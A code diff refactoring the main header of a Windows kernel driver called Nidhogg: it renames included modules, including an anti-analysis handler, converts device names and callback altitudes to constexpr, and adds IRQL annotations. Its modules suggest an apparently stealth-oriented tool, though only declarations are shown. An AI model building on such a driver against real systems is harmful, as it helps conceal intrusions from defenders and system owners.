@@ -2,31 +2,38 @@
 #include "pch.h"
 
 extern "C" {
-	#include "WindowsTypes.hpp"
+	#include "WindowsTypes.h"
 }
 #include "NidhoggCommon.h"
-#include "ProcessUtils.hpp"
-#include "MemoryUtils.hpp"
-#include "FileUtils.hpp"
-#include "RegistryUtils.hpp"
-#include "AntiAnalysis.hpp"
-#include "NetworkUtils.hpp"
-#include "ScriptManager.h"
-#include "NidhoggDeviceControl.hpp"
-#include "InitialOperation.hpp"
+#include "ProcessHandler.h"
+#include "ThreadHandler.h"
+#include "MemoryHandler.h"
+#include "FileHandler.h"
+#include "RegistryHandler.h"
+#include "AntiAnalysisHandler.h"
+#include "NetworkHandler.h"
+#include "IrpHandlers.h"
 
 // Definitions.
 constexpr SIZE_T REGISTERED_OB_CALLBACKS = 2;
-#define DRIVER_NAME L"\\Driver\\Nidhogg"
-#define DRIVER_DEVICE_NAME L"\\Device\\Nidhogg"
-#define DRIVER_SYMBOLIC_LINK L"\\??\\Nidhogg"
-#define OB_CALLBACKS_ALTITUDE L"31105.6171"
-#define REG_CALLBACK_ALTITUDE L"31122.6172"
+constexpr wchar_t DRIVER_NAME[] = L"\\Driver\\Nidhogg";
+constexpr wchar_t DRIVER_DEVICE_NAME[] = L"\\Device\\Nidhogg";
+constexpr wchar_t DRIVER_SYMBOLIC_LINK[] = L"\\??\\Nidhogg";
+constexpr wchar_t OB_CALLBACKS_ALTITUDE[] = L"31105.6171";
+constexpr wchar_t REG_CALLBACK_ALTITUDE[] = L"31122.6172";
+
+extern "C" {
+    ULONG WindowsBuildNumber = 0;
+    PVOID AllocatePool2 = NULL;
+}
 
 // Prototypes.
-NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);
+DRIVER_INITIALIZE NidhoggEntry;
 DRIVER_UNLOAD NidhoggUnload;
-DRIVER_DISPATCH NidhoggDeviceControl, NidhoggCreateClose;
+
+_IRQL_requires_same_
+_IRQL_requires_(PASSIVE_LEVEL)
 void ClearAll();
+
+_IRQL_requires_max_(APC_LEVEL)
 bool InitializeFeatures();
-void ExecuteInitialOperations();
